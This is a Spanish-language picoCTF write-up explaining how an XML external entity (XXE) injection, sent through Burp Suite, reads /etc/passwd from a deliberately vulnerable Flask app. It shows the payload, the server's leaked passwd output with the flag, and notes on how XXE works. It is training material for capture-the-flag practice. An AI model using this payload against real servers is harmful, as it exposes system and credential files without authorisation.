## Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.
## Solución
para esta solución tuve que iniciar el un proxy con la aplicación BurpSuite y la extensión FoxyProxy para interceptar peticiones, ya que la pista decía "XML external entity Injection" la cual, es una vulnerabilidad de los sitios web en la que tu creas una entidad y la apuntas hacia algún archivo del proyecto aunque no esté en la página web como tal. Desde burpsuit, intercepté una petición POST la cual tenía la siguiente información:
```
POST /data HTTP/1.1
Host: saturn.picoctf.net:64596
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://saturn.picoctf.net:64596/
Content-Type: application/xml
Content-Length: 61
Origin: http://saturn.picoctf.net:64596
Connection: keep-alive
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>
```
la mandé al Repeater de BurpSuite para modificar esa petición creando una entidad xee que apunte al archivo etc/passwd de esta manera:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xee SYSTEM "file:///etc/passwd"> ]>
<data><ID>
&xee;
</ID></data>
```
la repuesta del servidor fue esta:
```
HTTP/1.1 200 OK
Server: Werkzeug/2.3.6 Python/3.8.10
Date: Mon, 29 Sep 2025 01:53:59 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1025
Connection: close

Invalid ID: 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e}
```
## Notas
### Partes de la Inyección XXE

1. **Declaración del `DOCTYPE`:** Esta es la primera parte del ataque. Se declara un `DOCTYPE` para decirle al analizador XML que el documento contendrá una definición de tipo de documento (DTD) personalizada. La vulnerabilidad se explota cuando el analizador está mal configurado y permite que esta declaración incluya una entidad externa.
    
2. **Declaración de la entidad externa:** Dentro del `DOCTYPE`, se declara una entidad (`ENTITY`) con un nombre (`xxe`) y se le asigna un valor de tipo `SYSTEM`. El valor que se le da es la ruta al archivo que quieres leer, como `file:///etc/passwd`.
    
3. **Referencia a la entidad:** La última parte es llamar a la entidad que declaraste (`&xxe;`) en algún lugar del cuerpo del documento XML. Cuando el analizador procesa esta referencia, la sustituye por el contenido del archivo al que apunta, y así es como se revela la información.
## Referencias
https://portswigger.net/web-security/xxe
